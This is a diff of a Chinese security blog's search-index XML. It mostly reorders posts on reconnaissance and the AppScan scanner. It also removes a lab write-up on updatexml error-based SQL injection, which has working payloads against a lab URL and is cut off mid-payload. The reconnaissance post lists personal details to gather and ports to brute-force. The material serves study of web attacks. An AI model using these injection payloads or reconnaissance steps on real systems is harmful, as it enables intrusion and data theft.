@@ -79,31 +79,6 @@
     
     
     <entry>
-      <title>渗透测试的灵魂信息收集</title>
-      <link href="/2020/04/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E7%81%B5%E9%AD%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
-      <url>/2020/04/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E7%81%B5%E9%AD%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="信息收集的作用"><a href="#信息收集的作用" class="headerlink" title="信息收集的作用"></a>信息收集的作用</h2><h2 id="0x00-为什么要进行信息收集？"><a href="#0x00-为什么要进行信息收集？" class="headerlink" title="0x00 为什么要进行信息收集？"></a>0x00 为什么要进行信息收集？</h2><p>当我们要对一个目标进行渗透测试的时候为了防止无从下手，我们首先要获得目标的信息，掌握详细情况，了解目标的弱点和安装短板，知己知彼，才能百战不殆。</p><p>在渗透测试时信息收集是我们的第一步，信息收集的全面性对于后期的渗透工作必为重要，甚至关联到能不能挖掘到漏洞<br><img src="https://img-blog.csdnimg.cn/20200402183814914.png" alt="在这里插入图片描述"></p><h2 id="0x01-信息收集收集什么？举个栗子"><a href="#0x01-信息收集收集什么？举个栗子" class="headerlink" title="0x01 信息收集收集什么？举个栗子"></a>0x01 信息收集收集什么？举个栗子</h2><p><img src="https://img-blog.csdnimg.cn/20200402184426462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-信息收集收集什么？"><a href="#0x02-信息收集收集什么？" class="headerlink" title="0x02 信息收集收集什么？"></a>0x02 信息收集收集什么？</h2><p><img src="https://img-blog.csdnimg.cn/20200402184035656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong><strong>总结：</strong></strong></p><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span>目标人物  电话，邮箱，密码，幸运数字<span class="token number">2</span><span class="token punctuation">.</span>目标环境      宿舍 教室 <span class="token number">3</span><span class="token punctuation">.</span>目标事件 周末常去<span class="token constant">XXXX</span>地方玩 喜欢周末去喝奶茶。总之就是收集一切对我们有用的信息</code></pre><h2 id="0x03-通过信息收集能干嘛？"><a href="#0x03-通过信息收集能干嘛？" class="headerlink" title="0x03 通过信息收集能干嘛？"></a>0x03 通过信息收集能干嘛？</h2><p>当然是加以利用，因为渗透测试的灵魂就是信息收集。</p><p>在实战中，我们要对某某站点进行渗透，那么就要先信息收集。</p><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span>目标站点管理员电话，邮箱，密码<span class="token number">2</span><span class="token punctuation">.</span>目标环境域名，脚本语言，数据库，中间件，框架，cms，开放端口。<span class="token number">3</span><span class="token punctuation">.</span>目标事件历史漏洞，使用手册，使用说明，通知，公众号。</code></pre><p><strong>例子1：<br>如果我们通过信息收集知道了某站点是个cms，并且存在漏洞，那么我们就可以进行通杀漏洞的直接攻击</strong></p><p><strong>例子2：<br>有些危险端口开放了我们就可以尝试入侵，例如 445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站</strong></p><h2 id="0x04-信息收集报告编写"><a href="#0x04-信息收集报告编写" class="headerlink" title="0x04 信息收集报告编写"></a>0x04 信息收集报告编写</h2><p><img src="https://img-blog.csdnimg.cn/20200402193151206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
-      
-      
-      <categories>
-          
-          <category> 信息收集 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 信息收集的作用 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>社会工程学攻击</title>
       <link href="/2020/04/18/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/"/>
       <url>/2020/04/18/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/</url>
@@ -121,6 +96,31 @@
         <tags>
             
             <tag> 社会工程学攻击获取目标帐号密码 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透测试的灵魂信息收集</title>
+      <link href="/2020/04/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E7%81%B5%E9%AD%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <url>/2020/04/18/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E7%81%B5%E9%AD%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="信息收集的作用"><a href="#信息收集的作用" class="headerlink" title="信息收集的作用"></a>信息收集的作用</h2><h2 id="0x00-为什么要进行信息收集？"><a href="#0x00-为什么要进行信息收集？" class="headerlink" title="0x00 为什么要进行信息收集？"></a>0x00 为什么要进行信息收集？</h2><p>当我们要对一个目标进行渗透测试的时候为了防止无从下手，我们首先要获得目标的信息，掌握详细情况，了解目标的弱点和安装短板，知己知彼，才能百战不殆。</p><p>在渗透测试时信息收集是我们的第一步，信息收集的全面性对于后期的渗透工作必为重要，甚至关联到能不能挖掘到漏洞<br><img src="https://img-blog.csdnimg.cn/20200402183814914.png" alt="在这里插入图片描述"></p><h2 id="0x01-信息收集收集什么？举个栗子"><a href="#0x01-信息收集收集什么？举个栗子" class="headerlink" title="0x01 信息收集收集什么？举个栗子"></a>0x01 信息收集收集什么？举个栗子</h2><p><img src="https://img-blog.csdnimg.cn/20200402184426462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-信息收集收集什么？"><a href="#0x02-信息收集收集什么？" class="headerlink" title="0x02 信息收集收集什么？"></a>0x02 信息收集收集什么？</h2><p><img src="https://img-blog.csdnimg.cn/20200402184035656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong><strong>总结：</strong></strong></p><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span>目标人物  电话，邮箱，密码，幸运数字<span class="token number">2</span><span class="token punctuation">.</span>目标环境      宿舍 教室 <span class="token number">3</span><span class="token punctuation">.</span>目标事件 周末常去<span class="token constant">XXXX</span>地方玩 喜欢周末去喝奶茶。总之就是收集一切对我们有用的信息</code></pre><h2 id="0x03-通过信息收集能干嘛？"><a href="#0x03-通过信息收集能干嘛？" class="headerlink" title="0x03 通过信息收集能干嘛？"></a>0x03 通过信息收集能干嘛？</h2><p>当然是加以利用，因为渗透测试的灵魂就是信息收集。</p><p>在实战中，我们要对某某站点进行渗透，那么就要先信息收集。</p><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span>目标站点管理员电话，邮箱，密码<span class="token number">2</span><span class="token punctuation">.</span>目标环境域名，脚本语言，数据库，中间件，框架，cms，开放端口。<span class="token number">3</span><span class="token punctuation">.</span>目标事件历史漏洞，使用手册，使用说明，通知，公众号。</code></pre><p><strong>例子1：<br>如果我们通过信息收集知道了某站点是个cms，并且存在漏洞，那么我们就可以进行通杀漏洞的直接攻击</strong></p><p><strong>例子2：<br>有些危险端口开放了我们就可以尝试入侵，例如 445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站</strong></p><h2 id="0x04-信息收集报告编写"><a href="#0x04-信息收集报告编写" class="headerlink" title="0x04 信息收集报告编写"></a>0x04 信息收集报告编写</h2><p><img src="https://img-blog.csdnimg.cn/20200402193151206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 信息收集的作用 </tag>
             
         </tags>
       
@@ -181,31 +181,6 @@
     
     
     <entry>
-      <title>Web漏洞扫描器 - Appscan</title>
-      <link href="/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20AppScan/"/>
-      <url>/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20AppScan/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00-AppScan-–-简介"><a href="#0x00-AppScan-–-简介" class="headerlink" title="0x00 AppScan – 简介"></a>0x00 AppScan – 简介</h2><p>  AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。</p><p>　　Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。</p><pre><code>我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。</code></pre><p>Web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备</p><h2 id="0x01-AppScan-–-安装"><a href="#0x01-AppScan-–-安装" class="headerlink" title="0x01 AppScan – 安装"></a>0x01 AppScan – 安装</h2><p>首先把文件拉进windows系统里，然后双击AppScan_Std_9.0.3.7_Eval_Win进行安装。<br><img src="https://img-blog.csdnimg.cn/20200404230632787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231053180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.把覆盖文件里的东西放进C:\Program Files (x86)\IBM\AppScan Standard，并双击9.0.3.7_iFix003-Update进行更新appscan</p><p><img src="https://img-blog.csdnimg.cn/20200404231116616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231155890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231224708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">  </p><h2 id="0x01-AppScan-–-创建扫描任务"><a href="#0x01-AppScan-–-创建扫描任务" class="headerlink" title="0x01 AppScan – 创建扫描任务"></a>0x01 AppScan – 创建扫描任务</h2><p>文件 –&gt;新建–&gt;选择扫描方式–&gt;下一步–&gt;输入站点–&gt;策略文件选择“缺省值”–&gt;启动全面扫描–&gt;完成</p><p><img src="https://img-blog.csdnimg.cn/20200404231714341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231815447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404231903405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231929870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232043923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232126579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232244159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232403520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232507404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web漏洞扫描工具 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Web漏洞扫描器 - Appscan </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Web漏洞扫描器 - awvs</title>
       <link href="/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20awvs/"/>
       <url>/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20awvs/</url>
@@ -223,6 +198,31 @@
         <tags>
             
             <tag> Web漏洞扫描器 - awvs </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web漏洞扫描器 - Appscan</title>
+      <link href="/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20AppScan/"/>
+      <url>/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20AppScan/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00-AppScan-–-简介"><a href="#0x00-AppScan-–-简介" class="headerlink" title="0x00 AppScan – 简介"></a>0x00 AppScan – 简介</h2><p>  AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。</p><p>　　Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。</p><pre><code>我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。</code></pre><p>Web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备</p><h2 id="0x01-AppScan-–-安装"><a href="#0x01-AppScan-–-安装" class="headerlink" title="0x01 AppScan – 安装"></a>0x01 AppScan – 安装</h2><p>首先把文件拉进windows系统里，然后双击AppScan_Std_9.0.3.7_Eval_Win进行安装。<br><img src="https://img-blog.csdnimg.cn/20200404230632787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231053180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.把覆盖文件里的东西放进C:\Program Files (x86)\IBM\AppScan Standard，并双击9.0.3.7_iFix003-Update进行更新appscan</p><p><img src="https://img-blog.csdnimg.cn/20200404231116616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231155890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231224708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">  </p><h2 id="0x01-AppScan-–-创建扫描任务"><a href="#0x01-AppScan-–-创建扫描任务" class="headerlink" title="0x01 AppScan – 创建扫描任务"></a>0x01 AppScan – 创建扫描任务</h2><p>文件 –&gt;新建–&gt;选择扫描方式–&gt;下一步–&gt;输入站点–&gt;策略文件选择“缺省值”–&gt;启动全面扫描–&gt;完成</p><p><img src="https://img-blog.csdnimg.cn/20200404231714341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231815447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404231903405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231929870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232043923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232126579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232244159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232403520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232507404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web漏洞扫描工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web漏洞扫描器 - Appscan </tag>
             
         </tags>
       
@@ -456,31 +456,6 @@
     
     
     <entry>
-      <title>updatexml报错注入与delete注入</title>
-      <link href="/2019/10/03/updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%8Edelete%E6%B3%A8%E5%85%A5/"/>
-      <url>/2019/10/03/updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%8Edelete%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="updatexml函数介绍："><a href="#updatexml函数介绍：" class="headerlink" title="updatexml函数介绍："></a>updatexml函数介绍：</h2><p>updatexml()更新xml文档的函数<br>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p><pre class=" language-sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>实际上这里是去更新了<code>XML文档</code>，但是我们在XML文档路径的位置里面写入了<code>子查询</code>，我们<code>输入特殊字符，然后就因为不符合输入规则然后报错了</code></p><p>但是报错的时候他其实已经执行了那个子查询代码！</p><p><code>[0x7e</code> 实际是是<code>16进制</code>，<code>Mysql支持16进制</code>，<code>但是开头得写0x</code>    <code>0x7e是一个特殊符号</code>，<code>然后不符合路径规则报错]</code><br> <img src="https://img-blog.csdnimg.cn/20200420120623351.png" alt=""></p><h2 id="updatexml-用法："><a href="#updatexml-用法：" class="headerlink" title="updatexml()用法："></a>updatexml()用法：</h2><p><code>updatexml ()</code> 这个函数一般是<code>配合and 或者是or 使用的</code>，他和联合查询不同，不需要在意什么字段数<br>eg:</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> news <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>但是要注意，<code>and</code> 情况下只要一个为<code>False</code>，就会判定是<code>False</code>,所以如果<code>and</code>前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候建议使用or<br>某些没有回显盲注也可以用这个<code>updatexml()</code>做出来。<br>但是报错一般有长度限制，不能输出太长的数据，尽量不要使用<code>group_concat()</code>。<br><strong>聂风老师说：有些盲注也可以试试看报错注入，因为有的时候报错注入的致命错误会显示出来，数据库只忽略普通报错]</strong></p><h2 id="uodatexml报错注入的实战操作"><a href="#uodatexml报错注入的实战操作" class="headerlink" title="uodatexml报错注入的实战操作"></a>uodatexml报错注入的实战操作</h2><p>这个靶场是<code>delete注入</code>，有一个留言板，添加之后可以删除，删除的时候有一个链接<br>就是找这个链接进行<code>delete注入</code>。<br><img src="https://img-blog.csdnimg.cn/20200420110219968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="删除按钮存在链接">得到这个链接后我们就是尝试注入了，在64后面加个单引号，这时候报错了，说明这里存在sql注入。<br><img src="https://img-blog.csdnimg.cn/20200420110424420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="报错，存在注入">这里没有回显，所以这里使用报错注入。首先先爆库名<code>pikaqiu</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select database()),0x7e),1)--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200420111043665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="爆库名">爆出表名:<code>message</code></p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//219.153.49.228:44138/sqli_del.php?id=62 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where 